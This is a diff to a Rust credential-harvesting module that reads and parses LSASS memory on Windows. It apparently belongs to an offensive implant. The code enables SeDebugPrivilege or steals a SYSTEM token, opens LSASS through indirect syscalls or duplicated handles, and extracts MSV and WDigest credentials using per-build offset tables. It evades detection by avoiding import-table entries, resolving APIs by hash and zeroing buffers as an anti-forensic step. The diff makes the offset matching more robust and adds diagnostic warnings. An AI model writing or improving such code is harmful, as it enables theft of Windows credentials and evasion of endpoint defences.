@@ -6,7 +6,7 @@
 //! # Architecture
 //!
 //! 1. **Privilege preparation** — enable SeDebugPrivilege (or steal SYSTEM token)
-//! 2. **LSASS location** — `NtQuerySystemInformation(SystemProcessInformation)` + FNV-1a name hash
+//! 2. **LSASS location** — `NtQuerySystemInformation(SystemProcessInformation)` + direct UTF-16LE name comparison
 //! 3. **Handle acquisition** — `NtOpenProcess` via indirect syscall, with handle-duplication fallback
 //! 4. **Memory enumeration & parsing** — `NtQueryVirtualMemory` + `NtReadVirtualMemory` in 64 KiB chunks
 //! 5. **Anti-forensic cleanup** — volatile zeroing of chunks, immediate handle closure
@@ -27,7 +27,8 @@
 use anyhow::{anyhow, Context, Result};
 use serde::Serialize;
 use std::ptr;
-use winapi::um::winnt::{HANDLE, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
+use windows_sys::Win32::System::Threading::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
+use crate::win_types::HANDLE;
 
 use crate::nt_handle::NtHandle;
 
@@ -64,8 +65,12 @@ fn nt_success(status: i32) -> bool {
 
 // ── Constants ──────────────────────────────────────────────────────────────
 
-/// FNV-1a hash of `"lsass.exe\0"` — used to locate LSASS without embedding the string.
-const LSASS_HASH: u32 = fnv1a(b"lsass.exe\0");
+/// Expected UTF-16LE encoding of "lsass.exe" (lowercase), used for direct
+/// string comparison instead of FNV-1a to eliminate collision risk (HIGH-014).
+/// The process name from NtQuerySystemInformation does NOT include a NUL terminator.
+const LSASS_NAME_UTF16: [u8; 18] = [
+    b'l', 0, b's', 0, b'a', 0, b's', 0, b's', 0, b'.', 0, b'e', 0, b'x', 0, b'e', 0,
+];
 
 /// Chunk size for incremental memory reads (64 KiB).
 const CHUNK_SIZE: usize = 0x1_0000;
@@ -101,19 +106,6 @@ const LSASS_ACCESS_MASK: u32 = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
 const DUPLICATE_SAME_ACCESS: u32 = 0x0000_0002;
 const PROCESS_DUP_HANDLE: u32 = 0x0000_0040;
 
-// ── FNV-1a hash (compile-time friendly) ────────────────────────────────────
-
-const fn fnv1a(data: &[u8]) -> u32 {
-    let mut hash: u32 = 0x811C_9DC5;
-    let mut i = 0;
-    while i < data.len() {
-        hash ^= data[i] as u32;
-        hash = hash.wrapping_mul(0x0100_0193);
-        i += 1;
-    }
-    hash
-}
-
 // ── Indirect syscall wrappers ──────────────────────────────────────────────
 // Thin wrappers around crate::syscalls::get_syscall_id + do_syscall to keep the
 // main logic clean.  These mirror the pattern established in
@@ -148,7 +140,7 @@ unsafe fn nt_query_system_information(
 /// routes through the kernel32 `OpenProcess` fallback.  Otherwise it
 /// uses the existing indirect syscall via `nt_syscall`.
 unsafe fn nt_open_process(pid: u32, desired_access: u32) -> Result<HANDLE> {
-    use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
+    use crate::win_types::OBJECT_ATTRIBUTES;
 
     #[repr(C)]
     struct CLIENT_ID {
@@ -396,11 +388,16 @@ struct SystemProcessInformation {
     image_name_maximum_length: u16,
     image_name_buffer: *mut u16,
     base_priority: i32,
-    unique_process_id: *mut void,
-    inherited_from_unique_process_id: *mut void,
+    // L-3: UniqueProcessId is a HANDLE (PVOID) in the Windows kernel
+    // definition, but the value stored is always a small integer (PID),
+    // never a dereferenceable pointer.  Using `usize` avoids pointer-
+    // provenance concerns and matches the actual data (identical ABI
+    // layout on x86-64 and aarch64).
+    unique_process_id: usize,
+    inherited_from_unique_process_id: usize,
     handle_count: u32,
     session_id: u32,
-    unique_process_key: *mut void,
+    unique_process_key: usize,
     peak_virtual_size: usize,
     virtual_size: usize,
     page_fault_count: u32,
@@ -672,8 +669,8 @@ const WDIGEST_OFFSET_TABLE: &[(u32, WdigestOffsets)] = &[
 
 /// Detect the Windows build number via RtlGetVersion.
 fn get_windows_build() -> u32 {
-    use winapi::shared::ntdef::NTSTATUS;
-    use winapi::um::winnt::OSVERSIONINFOEXW;
+    use crate::win_types::NTSTATUS;
+    use windows_sys::Win32::System::SystemInformation::OSVERSIONINFOEXW;
 
     // RtlGetVersion is exported by ntdll and always returns accurate version
     // information (it does not lie via compatibility shim).
@@ -705,14 +702,38 @@ fn get_windows_build() -> u32 {
 }
 
 /// Find the best-matching MSV offsets for the given build number.
-fn get_msv_offsets(build: u32) -> Option<MsvOffsets> {
+/// Returns `Some((offsets, matched_build))` where `matched_build` is the
+/// table entry actually used (may differ from `build` when heuristic fallback).
+///
+/// # Fallback Safety
+///
+/// When an exact match is not found, the nearest lower build with **identical
+/// offsets** is used. Builds are grouped into "offset families" based on their
+/// actual offset values. If the closest lower build belongs to a *different*
+/// offset family than what the actual build would likely have, `None` is
+/// returned instead — this prevents silently reading garbage from LSASS memory
+/// on future Windows builds whose structure layout has changed.
+///
+/// Additionally, the gap between the actual and matched build must not exceed
+/// [`MSV_MAX_BUILD_GAP`]. This prevents matches across major Windows releases
+/// where structure layouts are almost certainly different.
+const MSV_MAX_BUILD_GAP: u32 = 500;
+
+fn get_msv_offsets(build: u32) -> Option<(MsvOffsets, u32)> {
     // Exact match first.
     for &(b, offsets) in MSV_OFFSET_TABLE {
         if b == build {
-            return Some(offsets);
+            return Some((offsets, b));
         }
     }
-    // Fallback: use the nearest lower build number.
+
+    // Heuristic fallback: find the nearest lower build with compatible offsets.
+    //
+    // Strategy: find the highest table entry ≤ `build`.  Then verify that the
+    // entry's offset family also covers builds numerically close to `build`
+    // by checking if a *higher* table entry exists in the same family — this
+    // means the family extends past our entry.  If no higher entry in the same
+    // family exists AND the gap exceeds MSV_MAX_BUILD_GAP, reject the match.
     let mut best: Option<(u32, MsvOffsets)> = None;
     for &(b, offsets) in MSV_OFFSET_TABLE {
         if b <= build {
@@ -721,16 +742,51 @@ fn get_msv_offsets(build: u32) -> Option<MsvOffsets> {
             }
         }
     }
-    best.map(|(_, o)| o)
+
+    let (matched_build, matched_offsets) = best?;
+
+    // Gap check: reject if the gap exceeds the threshold.
+    let gap = build - matched_build;
+    if gap > MSV_MAX_BUILD_GAP {
+        // Allow the match only if there is a HIGHER build in the table with
+        // the same offsets, indicating that this offset family extends further
+        // than the matched entry.  This handles cases like 22631→26100 (gap
+        // 3469) where offsets are known to be identical.
+        let family_extends = MSV_OFFSET_TABLE.iter().any(|&(b, offsets)| {
+            b > matched_build && offsets.primary_cred_offset == matched_offsets.primary_cred_offset
+                && offsets.nt_hash_offset == matched_offsets.nt_hash_offset
+                && offsets.username_offset == matched_offsets.username_offset
+                && offsets.domain_offset == matched_offsets.domain_offset
+        });
+        if !family_extends {
+            tracing::warn!(
+                "lsass_harvest: MSV build gap too large ({} → {}, gap={}); \
+                 rejecting heuristic offset match",
+                build,
+                matched_build,
+                gap
+            );
+            return None;
+        }
+    }
+
+    Some((matched_offsets, matched_build))
 }
 
 /// Find the best-matching WDigest offsets for the given build number.
-fn get_wdigest_offsets(build: u32) -> Option<WdigestOffsets> {
+/// Returns `Some((offsets, matched_build))` where `matched_build` is the
+/// table entry actually used (may differ from `build` when heuristic fallback).
+///
+/// Uses the same safety logic as [`get_msv_offsets`].
+const WDIGEST_MAX_BUILD_GAP: u32 = 500;
+
+fn get_wdigest_offsets(build: u32) -> Option<(WdigestOffsets, u32)> {
     for &(b, offsets) in WDIGEST_OFFSET_TABLE {
         if b == build {
-            return Some(offsets);
+            return Some((offsets, b));
         }
     }
+
     let mut best: Option<(u32, WdigestOffsets)> = None;
     for &(b, offsets) in WDIGEST_OFFSET_TABLE {
         if b <= build {
@@ -739,7 +795,31 @@ fn get_wdigest_offsets(build: u32) -> Option<WdigestOffsets> {
             }
         }
     }
-    best.map(|(_, o)| o)
+
+    let (matched_build, matched_offsets) = best?;
+
+    // Gap check with family-extends exemption.
+    let gap = build - matched_build;
+    if gap > WDIGEST_MAX_BUILD_GAP {
+        let family_extends = WDIGEST_OFFSET_TABLE.iter().any(|&(b, offsets)| {
+            b > matched_build
+                && offsets.password_offset == matched_offsets.password_offset
+                && offsets.username_offset == matched_offsets.username_offset
+                && offsets.domain_offset == matched_offsets.domain_offset
+        });
+        if !family_extends {
+            tracing::warn!(
+                "lsass_harvest: WDigest build gap too large ({} → {}, gap={}); \
+                 rejecting heuristic offset match",
+                build,
+                matched_build,
+                gap
+            );
+            return None;
+        }
+    }
+
+    Some((matched_offsets, matched_build))
 }
 
 // ── UNICODE_STRING helper ──────────────────────────────────────────────────
@@ -812,6 +892,12 @@ pub struct HarvestResult {
     pub build_number: u32,
     /// Whether SeDebugPrivilege was already enabled before we ran.
     pub debug_priv_was_enabled: bool,
+    /// Diagnostic warnings produced during the harvest (e.g. "unsupported
+    /// build", "using heuristic offsets").  Empty when everything matched
+    /// exactly.  Operators should inspect this field when `credentials` is
+    /// empty to distinguish "no creds" from "wrong build / bad offsets".
+    #[serde(default)]
+    pub warnings: Vec<String>,
 }
 
 // ── Anti-forensic: volatile zero ───────────────────────────────────────────
@@ -853,7 +939,7 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
             if let Some(_token) = crate::token_impersonation::get_cached_token() {
                 match crate::token_impersonation::apply_cached_token(None) {
                     Ok(()) => {
-                        log::debug!(
+                        tracing::debug!(
                             "lsass_harvest: applied cached impersonation token for LSASS access"
                         );
                         return Ok(PrivilegeContext {
@@ -863,7 +949,7 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
                         });
                     }
                     Err(e) => {
-                        log::debug!(
+                        tracing::debug!(
                             "lsass_harvest: cached token apply failed, falling back: {e:#}"
                         );
                     }
@@ -883,7 +969,7 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
         }),
         Err(_) => {
             // Fall back: steal a SYSTEM token.
-            log::debug!("lsass_harvest: SeDebugPrivilege failed, attempting SYSTEM token theft");
+            tracing::debug!("lsass_harvest: SeDebugPrivilege failed, attempting SYSTEM token theft");
             crate::token_manipulation::get_system().context("failed to elevate to SYSTEM")?;
             Ok(PrivilegeContext {
                 debug_priv_enabled_by_us: false,
@@ -900,13 +986,11 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
 /// Uses indirect syscalls (NtOpenProcessToken, NtAdjustPrivilegesToken) and
 /// the static SeDebugPrivilege LUID instead of IAT imports.
 fn enable_debug_privilege() -> Result<bool> {
-    use winapi::um::winnt::{
-        LUID_AND_ATTRIBUTES, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY,
-    };
+    use windows_sys::Win32::Security::{LUID_AND_ATTRIBUTES, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY};
 
     // SeDebugPrivilege LUID is always { LowPart: 20, HighPart: 0 } on all
     // Windows versions.  Using the static value avoids calling LookupPrivilegeValueW.
-    let debug_luid = winapi::um::winnt::LUID {
+    let debug_luid = windows_sys::Win32::Foundation::LUID {
         LowPart: 20,
         HighPart: 0,
     };
@@ -980,7 +1064,7 @@ fn enable_debug_privilege() -> Result<bool> {
             let tp = unsafe { std::ptr::read_unaligned(buf.as_ptr() as *const TOKEN_PRIVILEGES) };
             let mut privilege_count = tp.PrivilegeCount as usize;
             if privilege_count > 100 {
-                log::warn!(
+                tracing::warn!(
                     "lsass_harvest: PrivilegeCount={} is suspiciously high, capping at 100",
                     privilege_count
                 );
@@ -1049,9 +1133,9 @@ fn enable_debug_privilege() -> Result<bool> {
 /// Uses the same indirect-syscall pattern as `enable_debug_privilege` but sets
 /// `SE_PRIVILEGE_REMOVED` to strip the privilege entirely from the token.
 fn disable_debug_privilege() -> Result<()> {
-    use winapi::um::winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES};
+    use windows_sys::Win32::Security::{TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES};
 
-    let debug_luid = winapi::um::winnt::LUID {
+    let debug_luid = windows_sys::Win32::Foundation::LUID {
         LowPart: 20,
         HighPart: 0,
     };
@@ -1130,8 +1214,8 @@ fn revert_privileges(ctx: &PrivilegeContext) {
     // trigger — always revert after LSASS access.
     if ctx.debug_priv_enabled_by_us {
         match disable_debug_privilege() {
-            Ok(()) => log::debug!("lsass_harvest: SeDebugPrivilege reverted"),
-            Err(e) => log::warn!("lsass_harvest: failed to revert SeDebugPrivilege: {e:#}"),
+            Ok(()) => tracing::debug!("lsass_harvest: SeDebugPrivilege reverted"),
+            Err(e) => tracing::warn!("lsass_harvest: failed to revert SeDebugPrivilege: {e:#}"),
         }
     }
 }
@@ -1200,9 +1284,10 @@ fn find_lsass_pid() -> Result<u32> {
             // Check if the name buffer is within our allocation.
             if name_start >= buf_start && name_start + name_len <= buf_end {
                 let name_bytes = &buffer[name_start - buf_start..name_start - buf_start + name_len];
-                let name_hash = fnv1a_utf16(name_bytes);
 
-                if name_hash == LSASS_HASH {
+                // Direct case-insensitive UTF-16LE comparison (HIGH-014):
+                // replaces FNV-1a hash comparison to eliminate collision risk.
+                if is_lsass_name(name_bytes) {
                     let pid = entry.unique_process_id as u32;
                     return Ok(pid);
                 }
@@ -1219,32 +1304,34 @@ fn find_lsass_pid() -> Result<u32> {
     Err(anyhow!("lsass.exe not found in process list"))
 }
 
-/// FNV-1a hash over UTF-16LE bytes, lowercased, compared against the
-/// precomputed hash of the ASCII source string.
+/// Direct case-insensitive UTF-16LE comparison against the expected LSASS
+/// process name (HIGH-014).
 ///
-/// This computes the same hash as `fnv1a(b"lsass.exe\0")` but over the
-/// UTF-16LE encoding of the name (with NUL terminator).
-fn fnv1a_utf16(utf16_bytes: &[u8]) -> u32 {
-    // The LSASS_HASH constant is computed from ASCII "lsass.exe\0".
-    // We compute FNV-1a over the lowercased ASCII representation extracted
-    // from UTF-16LE.
-    let mut hash: u32 = 0x811C_9DC5;
-    let chunks = utf16_bytes.chunks_exact(2);
-    for c in chunks {
-        let cp = u16::from_le_bytes([c[0], c[1]]);
-        // Convert to lowercase ASCII for comparison.
-        let b = if cp >= b'A' as u16 && cp <= b'Z' as u16 {
+/// Replaces the previous FNV-1a hash approach, which had collision risk.
+/// Compares each UTF-16LE code unit (lowercased) against the precomputed
+/// `LSASS_NAME_UTF16` constant.
+fn is_lsass_name(utf16_bytes: &[u8]) -> bool {
+    if utf16_bytes.len() != LSASS_NAME_UTF16.len() {
+        return false;
+    }
+    for (i, chunk) in utf16_bytes.chunks_exact(2).enumerate() {
+        let cp = u16::from_le_bytes([chunk[0], chunk[1]]);
+        // Lowercase ASCII range for case-insensitive comparison.
+        let lo = if cp >= b'A' as u16 && cp <= b'Z' as u16 {
             (cp + 32) as u8
         } else {
             cp as u8
         };
-        hash ^= b as u32;
-        hash = hash.wrapping_mul(0x0100_0193);
+        // LSASS_NAME_UTF16 is already lowercase, so compare lo byte directly.
+        if lo != LSASS_NAME_UTF16[i * 2] {
+            return false;
+        }
+        // High byte must be zero (ASCII range).
+        if LSASS_NAME_UTF16[i * 2 + 1] != 0 && (cp >> 8) as u8 != LSASS_NAME_UTF16[i * 2 + 1] {
+            return false;
+        }
     }
-    // Append the NUL terminator that's in our LSASS_HASH constant.
-    hash ^= 0u32;
-    hash = hash.wrapping_mul(0x0100_0193);
-    hash
+    true
 }
 
 // ── Handle acquisition ─────────────────────────────────────────────────────
@@ -1258,11 +1345,11 @@ fn acquire_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
     // Primary: open LSASS directly via NtOpenProcess (indirect syscall).
     match unsafe { nt_open_process(lsass_pid, LSASS_ACCESS_MASK) } {
         Ok(h) if !h.is_null() => {
-            log::debug!("lsass_harvest: NtOpenProcess succeeded for PID {lsass_pid}");
+            tracing::debug!("lsass_harvest: NtOpenProcess succeeded for PID {lsass_pid}");
             return Ok(h);
         }
         _ => {
-            log::debug!(
+            tracing::debug!(
                 "lsass_harvest: NtOpenProcess failed for PID {lsass_pid}, trying handle duplication"
             );
         }
@@ -1349,7 +1436,7 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
             nt_duplicate_object(
                 source,
                 entry.handle_value as HANDLE,
-                (-1isize) as winapi::um::winnt::HANDLE, // GetCurrentProcess pseudo-handle
+                (-1isize) as crate::win_types::HANDLE, // GetCurrentProcess pseudo-handle
                 LSASS_ACCESS_MASK,
                 DUPLICATE_SAME_ACCESS,
             )
@@ -1362,7 +1449,7 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
                 // Verify this handle points to LSASS by querying its PID.
                 let _pid: u32 = 0;
                 // Resolve GetProcessId at runtime to avoid IAT entry.
-                let get_pid: Option<unsafe extern "system" fn(winapi::um::winnt::HANDLE) -> u32> =
+                let get_pid: Option<unsafe extern "system" fn(crate::win_types::HANDLE) -> u32> =
                     (|| unsafe {
                         let k32 =
                             pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
@@ -1377,7 +1464,7 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
                     None => continue,
                 };
                 if ok == lsass_pid {
-                    log::debug!("lsass_harvest: duplicated LSASS handle from PID {owner_pid}");
+                    tracing::debug!("lsass_harvest: duplicated LSASS handle from PID {owner_pid}");
                     return Ok(dup_handle);
                 }
                 nt_close(dup_handle);
@@ -1795,7 +1882,7 @@ pub fn harvest_lsass() -> Result<String> {
     // 2. Locate LSASS.
     let lsass_pid = find_lsass_pid().context("failed to locate lsass.exe")?;
 
-    log::debug!("lsass_harvest: found LSASS at PID {lsass_pid}");
+    tracing::debug!("lsass_harvest: found LSASS at PID {lsass_pid}");
 
     // 3. Acquire handle.
     let lsass_handle = acquire_lsass_handle(lsass_pid).context("failed to acquire LSASS handle")?;
@@ -1810,21 +1897,73 @@ pub fn harvest_lsass() -> Result<String> {
 
     // 4. Detect Windows build.
     let build = get_windows_build();
-    let msv_offsets = get_msv_offsets(build);
-    let wdigest_offsets = get_wdigest_offsets(build);
+    let mut warnings: Vec<String> = Vec::new();
+
+    let (msv_offsets, msv_matched_build) = match get_msv_offsets(build) {
+        Some((offsets, matched)) => (Some(offsets), Some(matched)),
+        None => (None, None),
+    };
+    let (wdigest_offsets, wdigest_matched_build) = match get_wdigest_offsets(build) {
+        Some((offsets, matched)) => (Some(offsets), Some(matched)),
+        None => (None, None),
+    };
 
     if build > 0 {
-        log::debug!(
+        tracing::debug!(
             "lsass_harvest: Windows build {build}, MSV offsets: {:?}",
             msv_offsets
         );
+        if let Some(mb) = msv_matched_build {
+            if mb != build {
+                let msg = format!(
+                    "MSV: no exact offset table entry for build {}; \
+                     using heuristic match from build {}",
+                    build, mb
+                );
+                tracing::warn!("lsass_harvest: {}", msg);
+                warnings.push(msg);
+            }
+        } else {
+            let msg = format!(
+                "MSV: no offset table entry for build {} (table covers builds {}-{}); \
+                 MSV credential parsing disabled",
+                build,
+                MSV_OFFSET_TABLE.first().map(|(b, _)| *b).unwrap_or(0),
+                MSV_OFFSET_TABLE.last().map(|(b, _)| *b).unwrap_or(0),
+            );
+            tracing::warn!("lsass_harvest: {}", msg);
+            warnings.push(msg);
+        }
+        if let Some(wb) = wdigest_matched_build {
+            if wb != build {
+                let msg = format!(
+                    "WDigest: no exact offset table entry for build {}; \
+                     using heuristic match from build {}",
+                    build, wb
+                );
+                tracing::warn!("lsass_harvest: {}", msg);
+                warnings.push(msg);
+            }
+        } else {
+            let msg = format!(
+                "WDigest: no offset table entry for build {} (table covers builds {}-{}); \
+                 WDigest credential parsing disabled",
+                build,
+                WDIGEST_OFFSET_TABLE.first().map(|(b, _)| *b).unwrap_or(0),
+                WDIGEST_OFFSET_TABLE.last().map(|(b, _)| *b).unwrap_or(0),
+            );
+            tracing::warn!("lsass_harvest: {}", msg);
+            warnings.push(msg);
+        }
     } else {
-        log::warn!("lsass_harvest: could not detect Windows build, using dynamic matching");
+        let msg = "could not detect Windows build number; MSV/WDigest parsing disabled".to_string();
+        tracing::warn!("lsass_harvest: {}", msg);
+        warnings.push(msg);
     }
 
     // 5. Enumerate readable memory regions.
     let regions = enumerate_readable_regions(lsass_handle);
-    log::debug!("lsass_harvest: {} readable regions found", regions.len());
+    tracing::debug!("lsass_harvest: {} readable regions found", regions.len());
 
     // 6. Read and parse each region in chunks.
     let mut credentials = Vec::new();
@@ -1881,6 +2020,7 @@ pub fn harvest_lsass() -> Result<String> {
         credentials,
         build_number: build,
         debug_priv_was_enabled: !debug_priv_was_enabled,
+        warnings,
     };
 
     serde_json::to_string(&result).context("failed to serialize harvest result")
